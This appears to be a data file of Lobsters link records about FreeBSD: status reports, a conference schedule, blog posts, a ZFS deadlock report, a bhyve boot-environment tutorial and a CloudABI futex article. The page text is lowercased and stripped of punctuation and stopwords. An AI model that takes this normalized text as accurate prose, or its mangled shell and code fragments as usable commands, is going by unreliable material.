generic allwinner kernel config file nmi support pmu interrupt gpio sensor support thermal sensor support rsb reduced serial bus support pmu support security id support support allwinner gigabit ethernet controller found usb otg review security id support review soc support review ongoing work support use uboot efi implementation open task spi driverlcd supportany unsupported hardware device might interest contact sepherosa ziehau sepherosa gmailcom contact hongjiang zhang honzhan microsoftcom contact dexuan cui decui microsoftcom contact kylie liang kyliel microsoftcom bsdcan microsoft announced global availability freebsd image azure many freebsdbased azure virtual appliance azure marketplace including citrix system netscaler netgate pfsense microsoft also made indepth technical presentation introduce performance hyperv network device driver optimized reach full line rate network achieved decent performance network slide video presentation available bsdcan website microsoft continues strive optimize performance hyperv network storage device driver work ongoing replace internal data structure lro kernel api singlylinked list doublelinked list speed lro lookup hash table evaluate performance tcplroqueuembuf handling scsi inquiry hyperv storage driver enhanced make sure disk hotplug smartctl work reliably refer pr pr detail bi test case available github hyperv azure project sponsored microsoft contact bjoern zeeb bz freebsdorg vimage virtualization framework top freebsd jail introduced kernel eight year ago vnet virtualized network stack last year many people started use vimage production productionlike setup appliance adoption increased urgency finish work avoid panic network stack teardown avoid memory leak vnet teardown changed top bottom trying tear layer layer preferable removing interface first cleaning everything packet could flow interface gone along work various path potential memory leak plugged lastly vnet support added formerly unvirtualized component pf ipfilter firewall virtual interface project sponsored freebsd foundationopen task please test freebsd later reporting problem use vimage keyword freebsd bug tracker contact andrew turner andrew freebsdorg pmap code updated work full pagetable level allows u increase user virtual address space concomittant increase kernel virtual address space also allows increase size physical memory freebsd handle interrupt framework replaced intrng allows arm share interrupt controller driver case driver driver rewritten better integrate intrng busdma updated handle cache updated code assumes device noncoherent default unless device driver mark dma tag coherent creating generic thunderx pcie driver updated create coherent mapping device tree mark hardware coherent work also fixed issue found sync operation missing memory barrier number issue hwpmc fixed improves stability hwpmc known software issue single known issue seems hardwarerelated however testing required newpcib enabled includes handling pciresbus resource type old interface replaced removed kernel library includes support compatibility libc release prior brk sbrk function also removed allows workaround function c runtime removed loaderefi updated use event timer implement internal time function needed many uefi implementation handle gettime runtime service method mean loaderefi correctly count automatically booting initial support arm juno reference platform added hardware common within arm useful finding assumption cpuids booting juno required fixing kernel remove assumption booting cpu zero included assigning cpuids fixing assumption within driver cpuid gic cpuid freebsd boot cpu juno board investigation needed track boot fails cpu enabled initial work started booting freebsd raspberry pi board boot multiuser mode outoftree patch work needed bring patch tree expected happen soon end code freeze project sponsored freebsd foundation abt system ltd contact ed maste emaste freebsdorg reproducible build set software development practice create verifiable path humanreadable source code binary code used computer brief idea building binary software package document binary artifact twice source produce identical output reproduciblebuildsorg website provides background information documentation making build reproducible many folk contributed reproducible build effort freebsd src port last decade many practical benefit reproducible build bandwidth storage saving however growing interest broad open source free software community primarily software toolchain integrity perspective last year member debian project led comprehensive structured reproducible build effort baptiste daroussin ed maste attended first reproducible build summit athens last year since ed investigated state build reproducibility port tree presented reproducible build freebsd bsdcan workinprogress patch freebsd port tree build reproducibly diffoscope tool performs indepth comparison file archive directory understand binary artifact build reproducibly diffoscope result nonreproducible build ed talk available one link project sponsored freebsd foundationopen task integrate freebsd port build reproduciblebuildsorg continuous integration infrastructureintegrate reproducible build patch port treeinvestigate source nonreproducibility individual port contact john baldwin jhb freebsdorg contact luca pizzamiglio lucapizzamiglio gmailcom develgdb port updated gdb support system call catchpoints committed upstream support examining elf auxiliary vector data via info auxv committed upstream feature included gdb open task figure powerpc kgdb target able unwind stack past initial frameadd support platform arm mips upstream gdb userland kgdbadd support debugging powerpc vector registersadd support siginfoimplement info proc commandsimplement info o command contact rafael espíndola rafaelespindola gmailcom contact davide italiano dccitaliano gmailcom contact ed maste emaste freebsdorg lld linker llvm family project intended highperformance linker support elf coff macho object format possible lld maintains commandline functional compatibility existing gnu bfd ld gold linkers however author lld constrained strict compatibility would hamper performance desired functionality last quarter lld project implemented version script support sufficient handle freebsd base system important milestone path lld viable system linker lld still lack comprehensive linker script expression evaluation support therefore yet used link freebsd kernel project sponsored freebsd foundationopen task develop linker script expression improvement upstream lld projectimport newer lld snapshot vendor area add build infrastructure connect world build installed ldlldrequest port exprun usrbinld symlink ldlldextensive testing contact torsten zühlsdorff tz freebsdorg freebsd port collection three month gitlab continues mature gain adoption initial problem resolved one known issue left start boot help solving issue welcome staying sync upstream easy minor version monthly major release create big workload introducing number new dependency make testing updating expensive process gitlab project mention native support freebsd quite commendation current work aim fix open problem get latest major version port create documentation update progress contact freebsd gnome team freebsdgnome freebsdorg freebsd gnome team maintains gnome mate cinnamon desktop environment graphical user interface freebsd gnome part gnu project mate fork gnome desktop cinnamon desktop environment using gnome technology gnome look feel gnome ported help ruslan makhmatkhanov gustau perez work done updating gdm old version version reason scrollbars firefox longer working though investigated gtk theme support changed change backwards compatible theme update requires new gtk version feel free add blocker bug gnomegtk update bug bug used exprun gnome ready track themerelated port also problem open save dialog content going invisible open task finish gdm portinginvestigate scrollbars firefox missing opensave dialog content missing contact sergey kozlov sergeykozlov intelcom several tool intel r ethernet networking product available port package freebsd sysutilsintelnvmupdate application used update nonvolatile memory network device sysutilsintelqcu application used switch qsfp port mode network device netintelixlkmod updated driver enables tool support project sponsored intel corporationopen task freebsd support development included next release contact torsten zühlsdorff tz freebsdorg half year ago started promotion campaign improve support fetching port via research performed december showed port fetchable using port ignore freebsdorg pkg mirror result campaign following server successfully support vaultcentosorg mirrorcentosorg gstreamerfreedesktoporg peoplefreebsdorg enables port fetched via would like thank wolfgang zenker active supporting adoption latest ripe meeting brought topic nonsupport hindrance business hopeful talk changed mind help widen support contact kde freebsd team kde freebsdorg kde freebsd team focus packaging improving user experience kde qt freebsd many update committed port tree quarter even committed experimental port repository tobias berner adriaan de groot ralf nolden responsible work following notable update landed port tree quarter cmake port updated digikam port updated kdevelop port updated develqbs port added qt future build system qbs qt creator updated new port added project example provided qt make qt creator functional new port added qt api documentation used qt creator program base port updated following work occurred development repository created port qt created port qt branch uptodate kde upstream contains port framework plasma desktop application contact torsten zühlsdorff tz freebsdorg ruby rail base rubygems port collection currently version coexist since rail running support time come switch ongoing progress remove rail port tree port major update block overall process recent blocker outstanding update wwwredmine completed successfully move help porting testing feel free contact ruby freebsdorg mailing list news home status home
530,Lobsters,freebsd,FreeBSD,EuroBSDcon 2016 Talks & Schedule,https://2016.eurobsdcon.org/talks-schedule/,eurobsdcon talk schedule,talk schedule callforpapers tutorial schedule partner programme talk schedule eurobsdcon talk schedule eurobsdcon saturday room room room george nevilleneil martin pieuchot brad davis william dobbin antoine jacoutot brook davis taylor r campbell stefan sperling constantine murenin joerg sonnenberger philipp buehler bernard spil abhinav upadhyay gareth llewellyn dan langille sevan janiyan sunday room room room landry breuil emmanuel vadot ryota ozaki peter hessler liwen hsu baptiste daroussin arun thomas nanako momiyama dominic fandrey marc espie jim thompson george nevilleneil ingo schwarze gert,talk schedule following ourâ callforpapersâ following schedule depicted theâ tutorial schedule tutorial pageâ saturday also partner programme talk schedule eurobsdcon talk schedule eurobsdcon saturday room room room conference opening eurobsdcon foundation keynote coming decade bsd george nevilleneil break embracing bsd routing table martin pieuchot packaging freebsd base system brad davis subfiles netbsd william dobbin lunch rcd openbsd antoine jacoutot everything always wanted know hello world brook davis primer synchronizing multiprocessor kernel resource taylor r campbell bsda exam room openbsd meet stefan sperling bxrsu opengrok nginx web writing rewriting webapps nginxconf constantine murenin bulk building many core era joerg sonnenberger increasing diversity bsd project room break openbsd pfrdomains create splendid multitenancy firewall philipp buehler libressl replacing openssl freebsd base bernard spil automated learning man page abhinav upadhyay dropping hopefully stateful firewalling capacity pf openospfd gareth llewellyn talos use open source fight threat dan langille synchronisation userland source code amongst bsd sevan janiyan sunday room room room opening learnt natively building package exotic arch landry breuil allwinner support freebsd emmanuel vadot toward mpsafe networking netbsd ryota ozaki break bidirectional forwarding detection bfd implementation support openbsd peter hessler continuous integration freebsd project liwen hsu freebsd based high density filer baptiste daroussin lunch dtrace internals digging dtrace arun thomas towards fast ip forwarding nanako momiyama proposing replacement freebsd powerd dominic fandrey retrofitting privsep port tool marc espie math hard measurement improvement open crypto framework jim thompson george nevilleneil ought keep multibyte character support simple ingo schwarze break keynote internet attack selfgovernance consequence gert conference closing eurobsdcon foundation
531,Lobsters,freebsd,FreeBSD,A Grand Experiment,http://www.leolaporte.com/blog/a-grand-experiment,grand experiment,debian testing antergos difference linux freebsd matthew fuller http abmxcom whisper quiet workstation freebsdorg dell ultrasharp curved monitor daskeyboard professional sandstormio ubiquiti edgerouterx like,latest debacle forced upgrade window apple increasingly lockedin ecosystem got thinking really need use proprietary operating system get work done need use commercial cloud service store data always used linux since first time tried installing slackware first national tv show install linux live red hat often advocated ubuntu people older computer usually least one computer running linux around past couple year dell xps laptop great choice couple month ago bought oryx laptop ubuntu system integrator use studio time went even ubuntu began seem commercial migrated community supported debian testing archbased antergos distros everything use antergos oryx show using linux system chromebook pixel convinced really need use commercial operating system anything almost everything linux faster better reliable point reason see using opensource o lack software something need like video photo editing music making rocket launching year using linux great alternative libre software evolved replace commercial solution think time right make switch grand experiment possible wonder everything need even venerable robust system true unix o freebsd requirement stability everything work even security virus exploit snoop usability ui look good get speedy like wait task need email pgp signing coding hobbyist programmer requiring support lispschemeracket rust python maybe forth clojure meteor whatever else cool new password vault currently use lastpass syncs mobile eventually need find fo replacement photo editing toughest replace love photoshop lightroom get say gimp darktable linux reading excellent article difference linux freebsd matthew fuller playing past month come believe bsd would better choice matthew word bsd get bunch unix hacker sit try port unix system pc linux get bunch pc hacker sit try write unix system pc http love linux continue use laptop main workhorse desktop think freebsd better choice also look forward learning administering true unix system userland apps currently rely linux also readily available freebsd freebsd openbsd netbsd pcbsd etc freebsd largest community bsds freebsd handbook quite impressive said think bsd would suit well choose one contingency plan throwing away window mac laptop fact probably buy new macbook pro second come need use need commercial software also stuck using proprietary mobile device moment reason good cloud architecture important example replace lastpass evernote selfhosted open source alternative planned selfhosted cloud later another reason experiment going fun ordered beast machine abmxcom freebsd system integrator way know hardware work shiny new o based whisper quiet workstation case supermicro motherboard socket intel xeon ecc unbuffered samsung pro nvme boot x tb samsung evo ssds supplemented two already total dvd burner ordered freebsd dvd support even though download everything freebsdorg planning using zfs two pool one o pool data pool using zraid ssd storage giving total storage zfs one strong reason use freebsd nvidia geforce gtx gpu timing great prefer new gtx available yet gaming xbox driving several high re display want lag tearing scroll wireless n dual band pcie adapter w antenna yes sad say unless rewire house use wifi beast probably rewire house dell ultrasharp curved monitordaskeyboard professionalsome old microsoft mouse lying around shall dub system beast nothing flashy yak gazelle want desktop total cost well prefer dwell quote steve gibson hoping last computer buy lifetime hah also ordered small nucstyle box act server selfhosted cloud planning run sandstormio debian stable behind ubiquiti edgerouterx comcast business class cable modem next time continue chronicle journey land fo beast arrives meantime please excuse got reading welcome thought like like loading
533,Lobsters,freebsd,FreeBSD,ZFS Deadlock: 'Directory of Death' (npm triggers zfs rename deadlock),http://lists.freebsd.org/pipermail/freebsd-hackers/2016-July/049740.html,zfs deadlock directory death npm trigger zfs rename deadlock,zfs deadlock directory death ori eigenstateorg root information freebsdhackers mailing list,zfs deadlock directory death ori bernstein ori eigenstateorg sun jul utc got fun issue directory death desktop running zfs installing port program try touch directory usrports hang deadlocked vfs cache lookup sudo procstat kk pid tid comm tdname kstack fuser process seems triggered port install npm seems deadlocked renaming file p npm node sudo procstat kk pid tid comm tdname kstack node node node workerthread node workerthread node workerthread node workerthread node node node node specific directory causing issue usrportswwwnpmworkstageusrlocallibnodemodulesnpmnodemodulesnpmlognodemodulesgauge right running stock freebsd release freebsd oneeye freebsd sat may utc root usrobjusrsrcsysgeneric going guess deadlock go away reboot box nt rebooted yet since nt really impacting anything important keep bit someone want gather extra information track root cause ori bernstein information freebsdhackers mailing list
534,Lobsters,freebsd,FreeBSD,FreeBSD stable/11 branch created,https://svnweb.freebsd.org/base?view=revision&revision=302408,freebsd branch created,added modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified modified,copied head added prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed modified prop changed
535,Lobsters,freebsd,FreeBSD,BSD vs Linux (2004),http://www.over-yonder.net/~fullermd/rants/bsd4linux/01,bsd v linux,freebsd linux nt preliminary thought begin history definition intro dramatis persona design base system design port tree technical release technical upgrading technical port philosophy myth conclusion response,run freebsd computer lot friend run linux least one distribution naturally agree unixstyle operating system right choice disagree use impression bsd communit y general understand linux far better linux communit y understand bsd theory really relevant think lot linux people get turned bsd nt really understand put together thus rant bsd person want try explain bsd work way linux people absorb overwhelming similarity operating system case also lot difference probe difference find emerge deepseated disagreement disagreement development methodology deployment usage important important flavor ice cream superior comparing surface difference nt tell anything deeper difference explain justify group thing way nt list command correspondances netstat rnfinet bsd netstat rnainet linux thing thing involved adminning running bsd box use bsd instead linux use linux instead bsd use bsd instead bsd use linux instead linux bsd right linux wrong linux right bsd wrong god worship personally believe obviously o choice right telling believe learn fact origin behind fact make damn mind one preliminary thought lot philosophical disparity linux world bsd world lot expression one particularly like go something like bsd get bunch unix hacker sit try port unix system pc linux get bunch pc hacker sit try write unix system pc like quip sort absolute revealed truth give good feel difference bsds general much like traditional unices linux lot directline descendant bsd berkeley directline descendant original unix unixthetrademark trademark open group unixthecode owned sco one ca nt actually say bsds really unix sort statement triggered uslucb lawsuit extravaganza fact many way bsds direct derivative traditional unix show lot way show design base system packaging addons show partitioning mass storage show lot detail command show attitude reflex prejudice developer reflected code user bsd designed linux grown perhaps succinct way describe possibly correct begin first want backtrack bit history definition intro dramatis persona design base system design port tree technical release technical upgrading technical port philosophy myth conclusion response
536,Lobsters,freebsd,FreeBSD,bhyve-Bootable Boot Environments,http://callfortesting.org/bhyve-boot-environments/,bhyvebootable boot environment,bhyvebootable openzfs boot environment http june version michael dexter impunity consolidating default boot environment enter duplicating default boot environment creating new simple boot environment booting new boot environment bhyve oshogbo stefan bethke future development experimenting protocol beadm bsdnow feedback recent mention michael dexter,bhyvebootable openzfs boot environment http june version michael dexter elegantlysimple multibooting o upgrade zfs boot environment bhyve reading probably used personal computer bsd gnulinux operating system point attempted multiboot multiple operating system computer goal typically attempted complex disk partitioning bsd gnulinux boot loader like lilo grub plus several hour frustrating experimentation perhaps data loss exotic o experimentation driven virtualization work since late pragmatic reason multibooting o hardware notable update failback known good version credit freebsd long various strategy including nanobsd embedded system framework primary secondary root partition plus nextboot utility selecting next kernel various boot parameter get everything set correctly multiboot impunity good start time seen zfs boot environment used pcbsd freenas allow system update allow one fall back previous version something go wrong hat effort exist essentially purposebuilt appliance environment long sensed fun wonderful thing happened freebsd allan jude added boot environment menu freebsd loader welcome freebsd yo boot multi user enter boot ingle user sy esc ape loader prompt reboot option k ernel defaultkernel configure boot ptions select boot e nvironment last entry talking press see welcome freebsd yo active bootfs zfs sy p age boot environment default understand going look zfs configuration freshlyinstalled freebsd system root zfs list name used avail refer mountpoint none tmp usr usrhome usrports usrsrc var varaudit varcrash varlog varmail vartmp zpool name sync host name thinkpad see various default freebsd datasets note third entry set bootfs menu field current boot environment pool working root akin traditional root partition separate usr var like unlike traditional partition however datasets share space dataset consider setting quota want mitigate classic fill tmp denial service attack lacking quota convinced many datasets required okay put place fun first however little context may aware nontrivial interest virtualization assisted incorporation bhyve hypervisor freebsd rather followed docker xen course journey built nontrivial number handcrafted freebsd release use bhyve host virtual machine bhyve arrived freebsd proceeded continue test head development snapshot freebsd couresy freebsd release engineer glen barber done point forgotten freebsd release grateful package built freebsd head allow say give presentation see presentation vi apologize said equally nontrivial interest fresh o installation average life expectancy installation system matter week hardware minute virtual machine resulted nontrivial motivation simplify process promise last time use phrase let simplify process consolidating default boot environment disclaimer try production system first thing consolidate default boot environment contain single dataset prepare cohabitation additional sibling boot environment safely say want mount multiple operating system mount point ie one another child datasets usr similarly want forget mount desired dataset file system tree standard canmountproperties freebsd installation root zfs list h name xargs zfs get canmount name property value source canmount default canmount default canmount default canmount default canmount local canmount default canmount default canmount default canmount local canmount default canmount default canmount default canmount default canmount default mount point root zfs list h name xargs zfs get mountpoint name property value source mountpoint local mountpoint none local mountpoint local mountpoint tmp local mountpoint usr local mountpoint usrhome inherited mountpoint usrports inherited mountpoint usrsrc inherited mountpoint var local mountpoint varaudit inherited mountpoint varcrash inherited mountpoint varlog inherited mountpoint varmail inherited mountpoint vartmp inherited point must make decision preserving default freebsd partitioning boot environment go single dataset unlike would freebsd jail challenge canmount property blunt instrument want want given file system hierarchy mount boot want noauto inactive one set default layout noauto datasets usr var datasets mounted causing example new log collect folder var rather original datasets seek simplicity skip creating new simple boot environment section perform zfs destroy r default boot environment else let push limit change datasets canmount canmount noauto keeping mind cause descendant usr var mounted without additional step root zfs list hp name xargs zfs get h canmount grep cut xargs zfs set canmountnoauto root zfs list hp name xargs zfs get h canmount canmount noauto local canmount noauto local canmount noauto local canmount noauto local canmount local canmount noauto local canmount noauto local canmount noauto local canmount local canmount noauto local canmount noauto local canmount noauto local canmount noauto local canmount noauto local enter beadm additional step sysutilsbeadm port exists simplify boot environment management via activate mount command among others activate command toggle canmount property noauto plus set zpool bootfs property accordingly unfortunately time writing beadm bug preserve canmountoff property usr var datasets causing system fail boot remember set manually investigate bug said let perform actual consolidation child datasets root zfs rename root zfs rename root zfs rename unmount varlog device busy root zfs rename f root zfs list name used avail refer mountpoint none tmp usr usrhome usrports usrsrc var varaudit varcrash varlog varmail vartmp notice var dataset needed f force flag rename default dataset fully consolidated two thing stand first pool still mounted like storage pool without operating system find default dataset useful data directory transcends different operating system second choose keep datasets separate usrhome supposed system agnostic practicality custom varcachepkg dataset find constantly trying freenas head snapshot suggest reboot verify work pool ready completelyindependent boot environment duplicating default boot environment considering taking limitspushing route let look making copy rootdefault boot environment zfs snap r export zfs create zfs send r export zfs receive f zfs list internal error failed initialize zfs library reboot done send snapshot rootdefault boot environment rootduplicate internal error guess despite fact canmount property set noauto snapshot arrived mounted state causing default duplicate boot environment mounted atop one another fortunately reboot resolve keep mind descendant usr var mounted thanks canmountnoauto property system use beadm properly set canmount bootfs property remember bug mentioned root beadm list active mountpoint space created nickname default default duplicate nr duplicate root beadm activate duplicate activated successfully root zfs set canmountoff root zfs set canmountoff reboot true freebsd freebsd dualbooting based default boot environment however beadm set canmounton child datasets would cause collision choose different boot environment boot may resolvable boot loader adjustment solution create simpler setup similar different version freebsd creating new simple boot environment point nothing behave differently standard installation lay groundwork fun part consider root zfs create canmountnoauto mountpoint root mount zfs mnt root pkg install securitycarootnss root fetch http tar xf c mnt root fetch http tar xf c mnt root cp bootloaderconf mntboot root l mnt cshrc boot libexec rescue tmp profile dev medium root usr copyright etc mnt sbin var bin lib proc sys root umount mnt latest snapshot freebsd installed zfs boot environment mounted mnt note bootloaderconf step important success else zfs pool found kernel module loaded reboot choose select boot environment menu loader see result welcome freebsd yo active bootfs zfs sy p age boot environment default press select enter boot boot password set completely fresh installation reboot return look closely boot loader notice bootfs property mentioned zfs poollevel property determines default boot environment set system boot rather run root zpool set new default boot environment set destroy default boot environment like system dependent zfs pool boot loader hopefully implication starting sink achieved dual boot freebsd system version contained single dataset root taking step performed zfs send operation freenas installation new boot environment thus quadbooting system really get interesting fact experimental openindiana illumos build use freebsd uefi boot loader difficult truly dual boot freebsd illumos using zfs pool know gnulinux zfs boot environment support plan fullylegal incorporation zfs booting new boot environment bhyve step completely changed way track freebsd current entertain potential bhyve hypervisor want git source tree currentlyrunning system system fixed ip address interface consider strategy based excellent work oshogbo stefan bethke root pkg install git root git clone http githubcomstblassitudebootrootnfs root cd bootrootnfs root bootrootnfs make root bootrootnfs mount zfs mnt root bootrootnfs echo mnt alldirs etcexports root bootrootnfs service nfsd onestart root bootrootnfs bootrootnfs mnt e e e e bootnfsrootpathmnt root bootrootnfs kldload vmm root bootrootnfs ifconfig create root bootrootnfs ifconfig addm root bootrootnfs ifconfig create root bootrootnfs ifconfig addm root bootrootnfs bhyveload h mnt e e e e e e e e bootnfsrootpathmnt e mnt e vfsrootmountfromoptionsrw welcome freebsd yo boot multi user enter boot ingle user sy esc ape loader prompt reboot option k ernel kernel configure boot ptions bootkernelkernel syms bootkernelzfsko size loading required module opensolaris bootkernelopensolarisko size booting root bootrootnfs bhyve c h hostbridge virtionet lpc l stdio amnesiac login root root uname freebsd freebsd wed may utc root usrobjusrsrcsysgeneric root everything go according plan boot boot environment mounted mnt shared via nfs mnt bhyve hypervisor countless way adjust provides building block install additional operating system version effortlessly also boot bhyve prior booting bare metal upgraded forgot tweak made previous system simply boot previous boot environment retrieve preparing major update snapshot current boot environment clone new one future development using nfs achieve admittedly clumsy jakub klama experimenting plan protocol diskless bhyve booting working gnulinux freenas freebsd support forthcoming kris moore also added boot environment importexport support beadm boot environment administration utility think something installing freebsd release update derivative like freenas pfsense delivered directly new boot environment via zfs send welcome idea work bsdnow feedback thank allan jude kris moore recent mention article bsdnow using builtin nfs sharing tied zfs target boot environment must directory bhyveload h find boot directory kernel long run way go diskless bhyve boot copyright michael dexter unless specified otherwise feedback correction welcome
537,Lobsters,freebsd,FreeBSD,CloudABI's POSIX threads support: hierarchical futexes,https://nuxi.nl/blog/2016/06/22/cloudabi-futexes.html,cloudabi posix thread support hierarchical futexes,cloudabi posix thread support hierarchical futexes posix thread api overview posix synchronisation primitive mutex recursive priority inheritance readerswriter lock starvation condition variable barrier spinlock switch another thread semaphore shared memory implementing primitive efficiently futexes threading threading improvement priority inheritance support improvement solving thundering herd problem thundering herd problem requeueing thread mutex us priority inheritance cloudabi hierarchical futexes glibc nptl glibc nptl closing word info nuxinl,cloudabi posix thread support hierarchical futexes june ed schouten go without saying cloudabi support running multithreaded code like unixlike system cloudabi implement posix thread api pthreads short today article let focus single yet crucial aspect api namely synchronisation primitive eg mutexes article discus synchronisation primitive provided posix thread api implemented operating system like linux freebsd later see cloudabi implement differs system making use something call hierarchical futexes let start overview posix thread api overview posix synchronisation primitive commonly used synchronisation primitive provided posix thread api mutex type pthreadmutext default mutexes recursive perform priority inheritance feature enabled separately using pthreadmutexattr function alter mutex initialisation attribute essence possible perform two operation mutexes namely lock unlock mutex may unlocked thread locked owner api two operation follows disregarding feature timeouts trylocking etc int pthreadmutexlock pthreadmutext int pthreadmutexunlock pthreadmutext addition plain mutexes posix thread api also provides support readerswriter lock type pthreadrwlockt lock differ mutexes perform better protecting shared datastructures modified infrequently either allow multiple reader single writer acquire lock hence name feature readerswriter lock lack comparison plain mutexes though acquired reading recursively support write recursion implementation also required implement priority inheritance scheme meaning starvation may occur easily reason write lock preferably acquired infrequently briefly possible readerswriter lock three operation namely readlocking writelocking unlocking unlocking function automatically determines whether lock unlocked reading writing api three operation follows int pthreadrwlockrdlock pthreadrwlockt int pthreadrwlockunlock pthreadrwlockt int pthreadrwlockwrlock pthreadrwlockt another important primitive provided posix thread api pthreadcondt implement condition variable condition variable may used thread temporarily release mutex wait event occur thread signal condition variable wake single waiter also possible wake waiter broadcasting posix requires condition variable multiple waiter must released mutex api follows int pthreadcondbroadcast pthreadcondt int pthreadcondsignal pthreadcondt int pthreadcondwait pthreadcondt pthreadmutext posix thread api also provides additional synchronisation primitive describe briefly pthreadbarriert barrier used let thread thread pool wait completion pthreadoncet initialisation guard used execute callback function exactly pthreadspinlockt spinlock locking busy mutex cause thread suspend execution switch another thread spinlocks however cause calling thread spin lock instead spinlocks generally avoided quite wasteful case spinlock become available quickly semaphore notably missing posix thread api implementation provided different header file semaphoreh though little use practice combining mutexes condition variable provides functionality typically easier use understand interesting feature posix thread api also provides support using synchronisation primitive across multiple process placing shared memory feature enabled explicitly setting pshared attribute every shared instance pthreadprocessshared shared instance may expensive use private instance accessed thread belonging process implementing primitive efficiently futexes unixlike operating system traditionally provide support creating multiple kernellevel thread share address space initial implementation posix thread api eg freebsd libcr designed work entirely userspace limitation thread process scheduled across multiple cpu concurrently approach called threading meant kernel oblivious userspace synchronisation primitive scheduling thread within process responsibility threading library year linux freebsd switched threading library create full kernellevel thread every user thread model called threading kernel responsible scheduling individual thread need awareness synchronisation primitive need know thread blocked lock execution may suspended contended lock released also need know thread woken acquire lock next realise linux kernel implement feature called futexes fast userspace mutexes novel futexes require kernel bookkeeping case lock contention uncontended case exist solely userspace locked unlocked program without performing system call making fast freebsd implement similar feature called umtx code show futex api used implement simple mutex mutex modeled tristate either unlocked unlocked locked without thread waiting locked locked thread waiting contended uncontended case mymutexlock function switch lock value unlocked locked contended case switch lock value locked contended call kernel put thread sleep using futex operation futexwait happens next call mymutexunlock use futex operation futexwake wake sleeping thread prevent race could cause thread miss wakeups happen setting lock contended calling kernel kernel doublechecks value futex right going sleep mutex value contended futex operation futexwait return immediately include linuxfutexh include syssyscallh include limitsh include stdatomich include unistdh typedef enum unlocked lock currently unlocked locked lock acquired contended lock acquired waiting thread mymutext void mymutexinit mymutext mutex atomicinit mutex unlocked void mymutexlock mymutext mutex mymutext old unlocked old unlocked lock unlocked attempt acquire atomiccompareexchangeweak mutex old locked return else old contended atomiccompareexchangeweak mutex old contended lock locked set contended put thread sleep syscall sysfutex mutex futexwait contended null null void mymutexunlock mymutext mutex release lock wake waiting thread contended atomicexchange mutex unlocked contended syscall sysfutex mutex futexwake intmax null null futexwait futexwake operation also used implement condition variable one way implement would model simple counter thread want wait condition variable increment counter next odd value call futexwait broadcast function test whether counter odd value reset next even value wake waiting thread using futexwake typedef atomicint mycondt void mycondinit mycondt cond atomicinit cond void mycondwait mycondt cond mymutext mutex bump counter odd value indicate waiter int v atomicfetchor cond wait broadcast lock released mymutexunlock mutex syscall sysfutex cond futexwait v null null mymutexlock mutex void mycondbroadcast mycondt cond int v atomicload cond v condition variable waiter bump counter even value wake waiter atomiccompareexchangeweak cond v v syscall sysfutex cond futexwake intmax null null return looked basic way using futexes implement synchronisation primitive let discus couple improvement made linux futex system time improvement priority inheritance support order provide reliable support priority inheritance kernel must know thread owns locked mutex thread priority temporarily increased waiting thread highest priority course impossible simple tristate used solve linux added couple new futex operation called futexlockpi futexunlockpi unlike futexwait futexwake operation require futex variable used specified way unlocked variable contains value zero locked contains thread id owner allowing kernel extract increase thread priority needed top bit futex variable indicates whether thread waiting may set using futexlockpi set lock may released using futexunlockpi improvement solving thundering herd problem condition variable implementation seen nasty sideeffect condition variable multiple waiter broadcast wake time discover single thread progress need reacquire mutex often called thundering herd problem prevent happening make sense wake thread one one scheduling previous thread unlocked mutex accomplished using operation futexrequeue futexcmprequeue used wake single thread move remainder one futex condition variable another mutex requeueing thread mutex us priority inheritance supported linux using yet another set futex operation cloudabi hierarchical futexes designing cloudabi threading library reviewed existing implementation amazed overengineered seem example linux concept building synchronisation primitive top abstract wait wake operation may seemed sensible time practice shown model add lot complexity userspace threading library glibc nptl approximately line code size still couple glaring imperfection futexrequeue requeue thread futexes caller know address mean pthreadcondbroadcast use futexrequeue processshared condition variable mutex may even mapped caller address space native support readerswriter lock glibc nptl guard state pthreadrwlockt plain mutex meaning operation effectively serialised writelocking unlocking uncontested readerswriter lock take time mutex readlocking uncontested lock seems even slower writelocking make readerswriter lock unattractive use cloudabi therefore decided follow pragmatic approach use waitwake model instead use futexes closely match style posix synchronisation primitive cloudabi futexes typed right two different futex type cloudabilockt readerswriter lock also perfectly usable mutex unlocked lock value cloudabilockunlocked top two bit store whether lock waiter cloudabilockkernelmanaged whether lock acquired reading writing cloudabilockwrlocked locked reading bottom bit contain number reader locked writing bottom bit contain thread id owner futex type support write recursion may easily implemented userspace using separate counter stored next futex cloudabicondvart condition variable condition variable value cloudabicondvarhasnowaiters thread waiting woken possible perform three blocking kernellevel operation lockrdlock cloudabilockt lock acquires lock reading lockwrlock cloudabilockt lock acquires lock writing condvar cloudabicondvart condvar cloudabilockt lock wait condition variable temporarily unlocking lock locked writing two nonblocking operation lockunlock cloudabilockt lock unlocks lock locked writing condvarsignal cloudabicondvart condvar nwaiters wake specifed number thread waiting condition variable api reveals calling approach hierarchical instead treating futexes individual queue thread like system allows kernel construct directed graph lock zero condition variable pointing calling condvarsignal wake thread waiting condition variable requeued lock without needing provide address approach work even condition variable processshared may wonder operation unlocking lock locked reading reason always done userspace except lock thread waiting last read lock released case userspace first upgrade lock write lock calling lockunlock simplifies implementation lockunlock also prevents spurious call lock reader count longer incremented upgrading list relevant source file provide full insight cloudabi futexes work closing word working article discovered writing way accessible informative long quite challenging reason topic hand already pretty hard still hope enjoyed reading article provided insight mysterious world locking sure get touch info 